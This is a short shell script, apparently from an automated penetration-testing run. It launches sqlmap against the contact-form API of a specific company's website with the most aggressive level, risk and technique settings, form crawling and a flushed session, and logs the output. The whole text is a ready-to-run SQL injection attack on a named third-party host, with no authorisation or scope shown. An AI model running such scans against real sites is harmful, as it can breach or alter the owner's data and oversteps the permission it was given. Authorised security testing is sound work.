cd "$WORK_PATH"
OUT=tool_outputs/w40_sqlmap_full
sqlmap -u "https://www.infinitycapital.bh/api/send" \
 --data="fname=sqlmapProbe&lname=Security&areacode=973&tel=5551234&cname=QA+Tester&subject=Hello+there&msg=Testing+message+body&check=on&targets=probe@relay.invalid" \
 --batch --level=5 --risk=3 --delay=8 --timeout=25 --retries=1 --threads=1 \
 --technique=BEUSTQ --time-sec=10 --string='error' --flush-session \
 --output-dir=$OUT --forms > tool_outputs/w40_sqlmap_full.log 2>&1
echo DONE >> tool_outputs/w40_sqlmap_full.log
